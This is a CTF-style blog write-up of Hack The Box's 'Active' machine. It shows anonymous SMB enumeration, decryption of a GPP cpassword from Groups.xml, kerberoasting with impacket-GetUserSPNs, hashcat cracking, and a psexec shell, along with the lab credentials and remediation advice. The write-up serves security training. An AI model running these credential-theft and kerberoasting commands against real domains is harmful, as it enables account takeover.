---
layout: writeup
title: Active - HackTheBox
date: 2024-08-19 13:32:20 +0300
description: A Writeup of the Active Box from HackTheBox
image: # /assets/images/Active/Active.png
fig-caption: # Add figcaption (optional)
tags: [TJ Null, Windows]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Active, and it is rated Easy by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
```

Looks like we have a domain controller. First things first, I check smbclient to see if I can get access any shares without authentication, and it looks like I can list them at least. `smbclient -L \\\\10.10.10.100\\ -N`:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Replication     Disk      
SYSVOL          Disk      Logon server share 
Users           Disk      
```

I can't access Users. I can access Replication, but it doesn't seem to have anything interesting in it. I can't access rpcclient, see anything interesting with unauthenticated enum4linux, or use ldapsearch. Smbmap confirms I can only access the Replication share and only with Read permissions. I check impacket for kerberoastable or asreproastable users, but no dice. I start responder and prepare to dive back into the Replication share and wisely so. I find a file called Groups.xml with this content:

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Note in particular the `name="active.htb\SVC_TGS"` and `cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"`. Could it be a clue? Initially I can't figure out the hash type with nth or crackstation, so I just google "cpassword Groups.xml" and find that it can be decrypted with `gpp-decrypt` to give me a password of `GPPstillStandingStrong2k18`. 

After checking a few things, I find that I am able to now access the Users share through smb. I see that I can grab the user.txt flag, but I don't see anything else interesting here. 

I also access rpcclient and enumdomusers to find only these users:
```
Administrator
Guest
krbtgt
SVC_TGS
```

At this point I decided to try a few different impacket options including asreproasting and kerberoasting. I am able to pull a hash for the Administrator user using impacket `impacket-GetUserSPNs active.htb/'svc_tgs':'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request`:

![Active2.png](/assets/images/Active/Active2.png){: .responsive-image}

It takes a while but eventually it cracks through `hashcat -m 13100 Administrator.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` which gives us: `Administrator:Ticketmaster1968`

After that I simply use impacket-psexec to get a shell on the machine and grab the flags. 

![Active3.png](/assets/images/Active/Active3.png){: .responsive-image}

### Lessons Learned
This was a relatively simple box. I was briefly unsure how to deal with the GPP password, but it was cracked relatively easily with hashcat and `gpp-decrypt`. 

### Remediation Steps
- Don't allow the Replication share to be accessed without authentication. 
- If possible remove the hardcoded password from `Groups.xml` or remove it from the share. 
- Enforce stronger password policies as both passwords were cracked easily. 
- The Administrator password was accessible remotely through `GetUserSPNs`. Access to pull them should be restricted based on the principle of least privilege, so that should maybe be removed from the SVC_TGS user. 
- Avoid using privileged accounts for users requiring SPNs. 